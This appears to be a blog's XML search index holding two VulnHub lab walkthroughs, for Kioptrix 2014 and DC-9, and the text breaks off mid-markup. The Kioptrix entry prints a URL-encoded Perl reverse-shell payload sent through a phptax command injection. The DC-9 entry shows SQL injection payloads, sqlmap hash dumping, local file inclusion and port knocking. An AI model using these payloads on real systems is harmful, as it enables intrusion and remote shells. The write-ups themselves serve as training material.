<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>vulnhub_kioptrix_2014</title>
    <link href="/2024/07/23/vulnhub_kioptrix_2014/"/>
    <url>/2024/07/23/vulnhub_kioptrix_2014/</url>
    
    <content type="html"><![CDATA[<h1 id="vulnhub-kioptrix-2014"><a href="#vulnhub-kioptrix-2014" class="headerlink" title="vulnhub_kioptrix_2014"></a>vulnhub_kioptrix_2014</h1><p>Finally arrived at the last box of the Kioptrix series!</p><h4 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h4><p>I’ll start by seeking for open ports on the target box.I prefer using masscan and namp for this initial task.</p><p><img src="/2023/04/27/file-upload/image-20231113112052955.png" alt="image-20231113112052955"></p><p>The only service that exposed to us is HTTP on port 80 and port 8080.</p><p>Next step I ultilize dirsearch for directory brute-force, but I could find nothing interesting.</p><p><img src="/2023/04/27/file-upload/image-20231113112109035.png" alt="image-20231113112109035"></p><p>Let’s check them out in firefox:</p><p><img src="/2023/04/27/file-upload/image-20231113112121440.png" alt="image-20231113112121440"></p><p>It reminds me of 403 FORBIDDEN when I access port 8080.Then I shifted my focus to port 80.</p><p><img src="/2023/04/27/file-upload/image-20231113112139060.png" alt="image-20231113112139060"></p><p>It works! However, there is only the phrase “it works,” XD.</p><h4 id="Grabbing-a-shell"><a href="#Grabbing-a-shell" class="headerlink" title="Grabbing a shell"></a>Grabbing a shell</h4><p>Let’s dig deeper — view page source:</p><p><img src="/2023/04/27/file-upload/image-20231113112158809.png" alt="image-20231113112158809"></p><p>Well, now we get something new!</p><p><img src="/2023/04/27/file-upload/image-20231113112209835.png" alt="image-20231113112209835"></p><p>I failed to find file upload or command injection vulnerabilities that could help me access a reverse shell when I explore this new page. However, <code>pChart2.1.3</code> in url seized my attention.</p><p><img src="/2023/04/27/file-upload/image-20231113112221479.png" alt="image-20231113112221479"></p><p>The following steps are quite explicit.</p><p><img src="/2023/04/27/file-upload/image-20231113112232895.png" alt="image-20231113112232895"></p><p>It’s evident that there exists a arbitrary file read vulnerability.</p><p><img src="/2023/04/27/file-upload/image-20231113112247139.png" alt="image-20231113112247139"></p><p>However, we cannot rely on this vulnerability to gain access to the box, we must integrate it with other vulnerabilities. At this point, I recalled the earlier 403 page.</p><p>I googled default path of apache config file:</p><p><img src="/2023/04/27/file-upload/image-20231113112302555.png" alt="image-20231113112302555"></p><p>Let’s go to check its configuration:</p><p><img src="/2023/04/27/file-upload/image-20231113112314281.png" alt="image-20231113112314281"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Allow <span class="hljs-keyword">from</span> <span class="hljs-attribute">env</span>=Mozilla4_browser<br></code></pre></td></tr></table></figure><p>Access port 8080 using burp suite to check User-Agent.</p><p><img src="/2023/04/27/file-upload/image-20231113112332206.png" alt="image-20231113112332206"></p><p>Turn to proxy-settings, Match and replace rules, and then ticket Mozilla&#x2F;4.0:</p><p><img src="/2023/04/27/file-upload/image-20231113112343264.png" alt="image-20231113112343264"></p><p>Let’s try again:</p><p><img src="/2023/04/27/file-upload/image-20231113112433172.png" alt="image-20231113112433172"></p><p>BINGO! Now we can access port 8080.</p><p><img src="/2023/04/27/file-upload/image-20231113112543854.png" alt="image-20231113112543854"></p><p>Nevigate phptax directory and I cound not understand the presented page.</p><p>At this step, I will also suggest searchsploit:</p><p><img src="/2023/04/27/file-upload/image-20231113112556288.png" alt="image-20231113112556288"></p><p><img src="/2023/04/27/file-upload/image-20231113112602381.png" alt="image-20231113112602381"></p><p>So far, I can use the vulnerability mentioned above to grab a reverse shell by accessing the following page:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">192.168.122.17:8080</span>/phptax/drawimage.php?pfilez=xxx;perl+-e+%<span class="hljs-number">27</span>use+Socket%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>i%<span class="hljs-number">3</span>D%<span class="hljs-number">22192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">122</span>.<span class="hljs-number">111</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>p%<span class="hljs-number">3</span>D4444%<span class="hljs-number">3</span>Bsocket%<span class="hljs-number">28</span>S%<span class="hljs-number">2</span>CPF_INET%<span class="hljs-number">2</span>CSOCK_STREAM%<span class="hljs-number">2</span>Cgetprotobyname%<span class="hljs-number">28</span>%<span class="hljs-number">22</span>tcp%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>Bif%<span class="hljs-number">28</span>connect%<span class="hljs-number">28</span>S%<span class="hljs-number">2</span>Csockaddr_in%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>p%<span class="hljs-number">2</span>Cinet_aton%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>i%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">7</span>Bopen%<span class="hljs-number">28</span>STDIN%<span class="hljs-number">2</span>C%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">26</span>S%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>Bopen%<span class="hljs-number">28</span>STDOUT%<span class="hljs-number">2</span>C%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">26</span>S%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>Bopen%<span class="hljs-number">28</span>STDERR%<span class="hljs-number">2</span>C%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">26</span>S%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>Bexec%<span class="hljs-number">28</span>%<span class="hljs-number">22</span>%<span class="hljs-number">2</span>Fbin%<span class="hljs-number">2</span>Fsh+-i%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">3</span>B%<span class="hljs-number">27</span>;&amp;pdf=make<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/image-20231113112706972.png" alt="image-20231113112706972"></p><h4 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation"></a>Privilege escalation</h4><p>We can identify the system version of the target box as FREEBSD 9.0-RELEASE and we can easily find two poc using searchsploit.</p><p><img src="/2023/04/27/file-upload/image-20231113112718365.png" alt="image-20231113112718365"></p><p>I transfer the poc through nc because wget and some other commands are unavailable.</p><p><img src="/2023/04/27/file-upload/image-20231113112738209.png" alt="image-20231113112738209"></p><p>Compile and execute:</p><p><img src="/2023/04/27/file-upload/image-20231113112754343.png" alt="image-20231113112754343"></p><p>ROOT IT!</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
      <tag>walkthrough</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub_DC_9</title>
    <link href="/2024/07/23/vulnhub_DC_9/"/>
    <url>/2024/07/23/vulnhub_DC_9/</url>
    
    <content type="html"><![CDATA[<h1 id="vulnhub-DC-9"><a href="#vulnhub-DC-9" class="headerlink" title="vulnhub_DC_9"></a>vulnhub_DC_9</h1><p>In this article, I’m going to crack the DC-9 box of DC series in vulnhub.</p><p>portscan:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">┌──(root㉿kali)-[~/Desktop]<br>└─<span class="hljs-comment"># nmap -sC -sV 192.168.122.20 </span><br>Starting Nmap <span class="hljs-number">7.94</span> ( <span class="hljs-keyword">https</span>://nmap.org ) <span class="hljs-keyword">at</span> <span class="hljs-number">2023</span><span class="hljs-number">-11</span><span class="hljs-number">-13</span> <span class="hljs-number">20</span>:<span class="hljs-number">41</span> EST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">192.168</span><span class="hljs-number">.122</span><span class="hljs-number">.20</span><br>Host is up (<span class="hljs-number">0.00029</span>s latency).<br>Not shown: <span class="hljs-number">998</span> closed tcp ports (reset)<br>PORT   STATE    SERVICE VERSION<br><span class="hljs-number">22</span>/tcp filtered ssh<br><span class="hljs-number">80</span>/tcp <span class="hljs-built_in">open</span>     <span class="hljs-keyword">http</span>    Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.38</span> ((Debian))<br>|<span class="hljs-title">_http-server-header</span>: Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.38</span> (Debian)<br>|<span class="hljs-title">_http-title</span>: Example.com - Staff Details - Welcome<br>MAC Address: <span class="hljs-number">00</span>:<span class="hljs-number">0</span>C:<span class="hljs-number">29</span>:<span class="hljs-number">04</span>:A2:<span class="hljs-number">19</span> (VMware)<br><br>Service detection performed. Please report <span class="hljs-keyword">any</span> incorrect results <span class="hljs-keyword">at</span> <span class="hljs-keyword">https</span>://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">7.63</span> <span class="hljs-built_in">seconds</span><br></code></pre></td></tr></table></figure><p>It seems that only port 80 is open. Port 22 is filtered, let’s put it on hold for now.</p><p>When it comes to port 80, I will make an attempt to dirsearch and nikto subconsciously.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/Desktop]<br>└─# dirsearch -u http://192.168.122.20<br><br>  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                                                                                  <br> (_||| _) (/_(_|| (_| )                                                                                                                                                                                           <br>                                                                                                                                                                                                                  <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/192.168.122.20/_23-11-13_20-48-30.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-11-13_20-48-30.<span class="hljs-built_in">log</span><br><br>Target: http://192.168.122.20/<br><br>[20:48:30] Starting: <br>[20:48:32] 403 -  279B  - /.ht_wsr.txt                                     <br>[20:48:32] 403 -  279B  - /.htaccess.save                                  <br>[20:48:32] 403 -  279B  - /.htaccess.bak1<br>[20:48:32] 403 -  279B  - /.htaccess.sample<br>[20:48:32] 403 -  279B  - /.htaccess_sc<br>[20:48:32] 403 -  279B  - /.htaccess.orig<br>[20:48:32] 403 -  279B  - /.htaccess_orig<br>[20:48:32] 403 -  279B  - /.htaccess_extra<br>[20:48:32] 403 -  279B  - /.htaccessBAK<br>[20:48:32] 403 -  279B  - /.htaccessOLD                                    <br>[20:48:32] 403 -  279B  - /.htaccessOLD2<br>[20:48:32] 403 -  279B  - /.htm<br>[20:48:33] 403 -  279B  - /.html<br>[20:48:33] 403 -  279B  - /.htpasswd_test<br>[20:48:33] 403 -  279B  - /.httr-oauth                                     <br>[20:48:33] 403 -  279B  - /.htpasswds                                      <br>[20:48:34] 403 -  279B  - /.php                                            <br>[20:48:55] 200 -    0B  - /config.php                                       <br>[20:48:56] 301 -  314B  - /css  -&gt;  http://192.168.122.20/css/              <br>[20:48:58] 200 -    3KB - /display.php                                      <br>[20:49:04] 200 -  747B  - /includes/                                        <br>[20:49:04] 301 -  319B  - /includes  -&gt;  http://192.168.122.20/includes/    <br>[20:49:04] 200 -  917B  - /index.php                                        <br>[20:49:04] 200 -  917B  - /index.php/login/                                 <br>[20:49:08] 302 -    0B  - /logout.php  -&gt;  manage.php                       <br>[20:49:08] 200 -    1KB - /manage.php                                       <br>[20:49:20] 200 -    1KB - /search.php                                       <br>[20:49:20] 403 -  279B  - /server-status                                    <br>[20:49:20] 403 -  279B  - /server-status/                                   <br>┌──(root㉿kali)-[~]<br>└─# nikto -h 192.168.122.20   <br>- Nikto v2.5.0<br>---------------------------------------------------------------------------<br>+ Target IP:          192.168.122.20<br>+ Target Hostname:    192.168.122.20<br>+ Target Port:        80<br>+ Start Time:         2023-11-13 20:48:36 (GMT-5)<br>---------------------------------------------------------------------------<br>+ Server: Apache/2.4.38 (Debian)<br>+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options<br>+ /: The X-Content-Type-Options header is not <span class="hljs-built_in">set</span>. This could allow the user agent to render the content of the site <span class="hljs-keyword">in</span> a different fashion to the MIME <span class="hljs-built_in">type</span>. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/<br>+ No CGI Directories found (use <span class="hljs-string">&#x27;-C all&#x27;</span> to force check all possible <span class="hljs-built_in">dirs</span>)<br>+ Apache/2.4.38 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL <span class="hljs-keyword">for</span> the 2.x branch.<br>+ /: Web Server returns a valid response with junk HTTP methods <span class="hljs-built_in">which</span> may cause <span class="hljs-literal">false</span> positives.<br>+ /config.php: PHP Config file may contain database IDs and passwords.<br>+ /css/: Directory indexing found.<br>+ /css/: This might be interesting.<br>+ /includes/: Directory indexing found.<br>+ /includes/: This might be interesting.<br>+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/<br>+ 8102 requests: 0 error(s) and 10 item(s) reported on remote host<br>+ End Time:           2023-11-13 20:49:08 (GMT-5) (32 seconds)<br>---------------------------------------------------------------------------<br>+ 1 host(s) tested<br></code></pre></td></tr></table></figure><p>The size of the config.php page is 0B, where an arbitrary file read vulnerability may be needed to obtain certain configuration information.</p><p>Here are also some 200-code pages, let’s check them out using firefox.</p><p><img src="/2023/04/27/file-upload/image-20231114103757119.png" alt="image-20231114103757119"></p><p>Brute force, SQLI — failed.</p><p>Display.php shows all user information and search.php privodes a input form for specific seaerching.</p><p><img src="/2023/04/27/file-upload/image-20231114104151851.png" alt="image-20231114104151851"></p><p><img src="/2023/04/27/file-upload/image-20231114104712219.png" alt="image-20231114104712219"></p><p>It displayed correct result when I input mary, however when I tried <code>0&#39; or 1=1 #</code> it responsed with whole info!</p><p><img src="/2023/04/27/file-upload/image-20231114104840433.png" alt="image-20231114104840433"></p><p>SQLMAP GO!</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs inform7">┌──(root㉿kali)-<span class="hljs-comment">[~/Desktop/vulnhub/DC-9]</span><br>└─# sqlmap -r DC9 --random-agent --dbms=mysql -D Staff -T Users -C Username,Password --dump      <br>        ___<br>       __H__                                                                                                                                                                                                      <br> ___ ___<span class="hljs-comment">[&quot;]</span>_____ ___ ___  &#123;1.7.8#stable&#125;                                                                                                                                                                          <br>|_ -| . <span class="hljs-comment">[&#x27;]</span>     | .&#x27;| . |                                                                                                                                                                                         <br>|___|_  <span class="hljs-comment">[.]</span>_|_|_|__,|  _|                                                                                                                                                                                         <br>      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                      <br><br><span class="hljs-comment">[!]</span> legal disclaimer: Usage <span class="hljs-keyword">of</span> sqlmap for attacking targets without prior mutual consent <span class="hljs-keyword">is</span> illegal. It <span class="hljs-keyword">is</span> the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and <span class="hljs-keyword">are</span> not responsible for any misuse or damage caused by this program<br><br><span class="hljs-comment">[*]</span> starting @ 21:58:47 /2023-11-13/<br><br><span class="hljs-comment">[21:58:47]</span> <span class="hljs-comment">[INFO]</span> parsing HTTP request from &#x27;DC9&#x27;<br><span class="hljs-comment">[21:58:47]</span> <span class="hljs-comment">[INFO]</span> fetched random HTTP User-Agent header value &#x27;Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-gb) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.2 Safari/525.20.1&#x27; from file &#x27;/usr/share/sqlmap/data/txt/user-agents.txt&#x27;                                                                                                                                                                              <br><span class="hljs-comment">[21:58:47]</span> <span class="hljs-comment">[INFO]</span> testing connection to the target URL<br><span class="hljs-comment">[21:58:47]</span> <span class="hljs-comment">[INFO]</span> checking if the target <span class="hljs-keyword">is</span> protected by some <span class="hljs-keyword">kind</span> <span class="hljs-keyword">of</span> WAF/IPS<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[INFO]</span> testing if the target URL content <span class="hljs-keyword">is</span> stable<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[INFO]</span> target URL content <span class="hljs-keyword">is</span> stable<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[INFO]</span> testing if POST parameter &#x27;search&#x27; <span class="hljs-keyword">is</span> dynamic<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[WARNING]</span> POST parameter &#x27;search&#x27; does not appear to be dynamic<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[WARNING]</span> heuristic (basic) test shows that POST parameter &#x27;search&#x27; might not be injectable<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[INFO]</span> testing for SQL injection on POST parameter &#x27;search&#x27;<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[INFO]</span> testing &#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[INFO]</span> testing &#x27;Boolean-based blind - Parameter replace (original value)&#x27;<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[INFO]</span> testing &#x27;Generic inline queries&#x27;<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[INFO]</span> testing &#x27;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#x27;<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[INFO]</span> testing &#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27;<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[WARNING]</span> time-based comparison requires larger statistical model, please wait............... (done)                                                                                                  <br><span class="hljs-comment">[21:59:08]</span> <span class="hljs-comment">[INFO]</span> POST parameter &#x27;search&#x27; appears to be &#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27; injectable <br>for the remaining tests, do you want to include all tests for &#x27;MySQL&#x27; extending provided level (1) and risk (1) values? <span class="hljs-comment">[Y/n]</span> y<br><span class="hljs-comment">[21:59:18]</span> <span class="hljs-comment">[INFO]</span> testing &#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27;<br><span class="hljs-comment">[21:59:18]</span> <span class="hljs-comment">[INFO]</span> automatically extending ranges for UNION query injection technique tests as there <span class="hljs-keyword">is</span> at least one other (potential) technique found<br><span class="hljs-comment">[21:59:18]</span> <span class="hljs-comment">[INFO]</span> target URL appears to be UNION injectable with 6 columns<br><span class="hljs-comment">[21:59:18]</span> <span class="hljs-comment">[INFO]</span> POST parameter &#x27;search&#x27; <span class="hljs-keyword">is</span> &#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27; injectable<br>POST parameter &#x27;search&#x27; <span class="hljs-keyword">is</span> vulnerable. Do you want to keep testing the others (if any)? <span class="hljs-comment">[y/N]</span> y<br>sqlmap identified the following injection point(s) with a total <span class="hljs-keyword">of</span> 59 HTTP(s) requests:<br>---<br>Parameter: search (POST)<br>    Type: time-based blind<br>    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<br>    Payload: search=1&#x27; AND (SELECT 9453 FROM (SELECT(SLEEP(5)))KFpZ) AND &#x27;pTLE&#x27;=&#x27;pTLE<br><br>    Type: UNION query<br>    Title: Generic UNION query (NULL) - 6 columns<br>    Payload: search=1&#x27; UNION ALL SELECT NULL,CONCAT(0x7170716271,0x50787558766b6c786b7663596d6f6b6f4d455975546751527162447053714a504b52776368594e6e,0x716a787171),NULL,NULL,NULL,NULL-- -<br>---<br><span class="hljs-comment">[21:59:19]</span> <span class="hljs-comment">[INFO]</span> the back-end DBMS <span class="hljs-keyword">is</span> MySQL<br>web server operating system: Linux Debian 10 (buster)<br>web application technology: Apache 2.4.38<br>back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)<br><span class="hljs-comment">[21:59:19]</span> <span class="hljs-comment">[INFO]</span> fetching entries <span class="hljs-keyword">of</span> column(s) &#x27;Password,Username&#x27; for table &#x27;Users&#x27; in database &#x27;Staff&#x27;<br><span class="hljs-comment">[21:59:19]</span> <span class="hljs-comment">[INFO]</span> recognized possible password hashes in column &#x27;Password&#x27;<br>do you want to store hashes to a temporary file for eventual further processing with other tools <span class="hljs-comment">[y/N]</span> y<br><span class="hljs-comment">[21:59:21]</span> <span class="hljs-comment">[INFO]</span> writing hashes to a temporary file &#x27;/tmp/sqlmapnlg9g_9g406618/sqlmaphashes-__m2zybn.txt&#x27; <br>do you want to crack them via a dictionary-based attack? <span class="hljs-comment">[Y/n/q]</span> y<br><span class="hljs-comment">[21:59:21]</span> <span class="hljs-comment">[INFO]</span> using hash method &#x27;md5_generic_passwd&#x27;<br>what dictionary do you want to use?<br><span class="hljs-comment">[1]</span> default dictionary file &#x27;/usr/share/sqlmap/data/txt/wordlist.tx_&#x27; (press Enter)<br><span class="hljs-comment">[2]</span> custom dictionary file<br><span class="hljs-comment">[3]</span> file with list <span class="hljs-keyword">of</span> dictionary files<br>&gt; y<br><span class="hljs-comment">[21:59:22]</span> <span class="hljs-comment">[INFO]</span> using default dictionary<br>do you want to use common password suffixes? (slow!) <span class="hljs-comment">[y/N]</span> <br><span class="hljs-comment">[21:59:23]</span> <span class="hljs-comment">[INFO]</span> starting dictionary-based cracking (md5_generic_passwd)<br><span class="hljs-comment">[21:59:23]</span> <span class="hljs-comment">[INFO]</span> starting 4 processes <br><span class="hljs-comment">[21:59:39]</span> <span class="hljs-comment">[WARNING]</span> no clear password(s) found                                                                                                                                                                  <br>Database: Staff<br><span class="hljs-section">Table: Users</span><br><span class="hljs-comment">[1 entry]</span><br>+----------+----------------------------------+<br>| Username | Password                         |<br>+----------+----------------------------------+<br>| admin    | 856f5de590ef37314e7c3bdf6f8a66dc |<br>+----------+----------------------------------+<br><br><span class="hljs-comment">[21:59:39]</span> <span class="hljs-comment">[INFO]</span> table &#x27;Staff.Users&#x27; dumped to CSV file &#x27;/root/.local/share/sqlmap/output/192.168.122.20/dump/Staff/Users.csv&#x27;<br><span class="hljs-comment">[21:59:39]</span> <span class="hljs-comment">[INFO]</span> fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.122.20&#x27;<br><br><span class="hljs-comment">[*]</span> ending @ 21:59:39 /2023-11-13/<br></code></pre></td></tr></table></figure><p>856f5de590ef37314e7c3bdf6f8a66dc — md5 decrypt: transorbital1</p><p>Login using admin account:</p><p><img src="/2023/04/27/file-upload/image-20231114110420113.png" alt="image-20231114110420113"></p><p>“FILE DOES NOT EXIST” — It indicates that welcome.php page may have a param. </p><p>Maybe file? Let’s check it.</p><p><img src="/2023/04/27/file-upload/image-20231114111547238.png" alt="image-20231114111547238"></p><p>We can successfully access &#x2F;etc&#x2F;passwd through file param.</p><p>Do you remember that port 22 is filtered? It is possible that knock tool is utilized for port hidden.</p><p>Try to access knockd.conf file with vul mentioned above:</p><p><img src="/2023/04/27/file-upload/image-20231114112125136.png" alt="image-20231114112125136"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs awk">──(root㉿kali)-[<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>wfuzz]<br>└─<span class="hljs-comment"># knock 192.168.122.20 7469:tcp 8475:tcp 9842:tcp</span><br>                                                                                                                                                                                                                  <br>┌──(root㉿kali)-[<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>wfuzz]<br>└─<span class="hljs-comment"># nmap -p 22 192.168.122.20 </span><br>Starting Nmap <span class="hljs-number">7.94</span> ( https:<span class="hljs-regexp">//</span>nmap.org ) at <span class="hljs-number">2023</span>-<span class="hljs-number">11</span>-<span class="hljs-number">13</span> <span class="hljs-number">22</span>:<span class="hljs-number">24</span> EST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">122.20</span><br>Host is up (<span class="hljs-number">0.0041</span>s latency).<br><br>PORT   STATE SERVICE<br><span class="hljs-number">22</span>/tcp open  ssh<br>MAC Address: <span class="hljs-number">00</span>:<span class="hljs-number">0</span>C:<span class="hljs-number">29</span>:<span class="hljs-number">04</span>:A2:<span class="hljs-number">19</span> (VMware)<br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">0.82</span> seconds<br></code></pre></td></tr></table></figure><p>Well, it worked.</p><p>Now we can access SSH service, however there’s nothing useful about valid accounts XD.</p><p>Let’s move back to sqlmap and check User database.</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 